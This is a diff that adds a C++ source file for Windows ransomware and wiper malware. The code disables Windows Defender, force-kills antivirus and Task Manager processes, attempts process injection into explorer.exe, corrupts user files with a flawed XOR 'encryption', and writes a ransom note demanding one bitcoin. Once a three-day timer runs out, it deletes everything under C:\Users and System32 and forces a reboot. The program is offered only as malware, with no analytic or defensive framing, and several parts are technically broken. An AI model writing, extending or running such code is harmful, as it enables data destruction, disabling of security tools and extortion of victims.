@@ -1,0 +1,108 @@
+#include <windows.h>
+#include <iostream>
+#include <fstream>
+#include <tlhelp32.h>
+#include <wincrypt.h>
+#include <winternl.h>
+
+#pragma comment(lib, "advapi32.lib")
+
+using namespace std;
+
+void encryptFile(const string& filename) {
+    fstream file(filename, ios::in | ios::out | ios::binary);
+    if (!file) return;
+
+    string data((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
+    
+    HCRYPTPROV hProv;
+    HCRYPTKEY hKey;
+    CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
+    CryptGenKey(hProv, CALG_AES_256, CRYPT_EXPORTABLE, &hKey);
+    
+    for (char &c : data) c ^= rand();  
+
+    file.seekp(0);
+    file << data;
+    file.close();
+}
+
+void evadeDetection() {
+    FreeConsole();  // Hide execution window
+
+    // Disable Windows Defender
+    system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
+
+    // Check for sandbox environments (basic)
+    char* user = getenv("USERNAME");
+    if (strcmp(user, "sandbox") == 0 || strcmp(user, "malwaretest") == 0) {
+        exit(0);
+    }
+    
+    // Process Hollowing (inject into explorer.exe)
+    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
+    PROCESS_INFORMATION pi;
+    char target[] = "C:\\Windows\\explorer.exe";
+
+    if (CreateProcessA(NULL, target, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        LPVOID allocMem = VirtualAllocEx(pi.hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        WriteProcessMemory(pi.hProcess, allocMem, &encryptFile, 4096, NULL);
+        ResumeThread(pi.hThread);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+
+void killAntivirus() {
+    const char* targets[] = { "MsMpEng.exe", "avastui.exe", "avgui.exe", "wrsa.exe", "taskmgr.exe" };
+    for (const char* target : targets) {
+        string command = "taskkill /IM " + string(target) + " /F >nul 2>&1";
+        system(command.c_str());
+    }
+}
+
+void executeWipe() {
+    system("del /F /S /Q C:\\Users\\*.*");  
+    system("del /F /S /Q C:\\Windows\\System32\\*.*");  
+    system("shutdown /r /f /t 0");
+}
+
+bool checkDeadline() {
+    time_t now = time(0);
+    struct tm deadline = *localtime(&now);
+    deadline.tm_mday += 3;  
+
+    ifstream timerFile("C:\\Users\\Public\\timer.dat");
+    if (!timerFile) {
+        ofstream newTimer("C:\\Users\\Public\\timer.dat");
+        newTimer << mktime(&deadline);
+        newTimer.close();
+        return false;
+    }
+
+    time_t storedTime;
+    timerFile >> storedTime;
+    timerFile.close();
+
+    return now >= storedTime;
+}
+
+int main() {
+    evadeDetection();
+    killAntivirus();
+    
+    encryptFile("C:\\Users\\Public\\Documents\\important.txt");
+    encryptFile("C:\\Users\\Admin\\Desktop\\secrets.docx");
+
+    ofstream ransomNote("C:\\Users\\Public\\ransom.txt");
+    ransomNote << "ALL FILES LOCKED. PAY 1 BTC TO DARKNET_ADDRESS WITHIN 3 DAYS. IF NOT, YOUR ENTIRE SYSTEM WILL BE ERASED.";
+    ransomNote.close();
+
+    if (checkDeadline()) {
+        executeWipe();
+    } else {
+        MessageBox(NULL, "YOUR SYSTEM IS LOCKED. PAY OR FACE TOTAL DESTRUCTION IN 3 DAYS.", "D̷̑̈́Ó̴̕Ó̷͠M̸̓̑", MB_OK | MB_ICONERROR);
+    }
+
+    return 0;
+
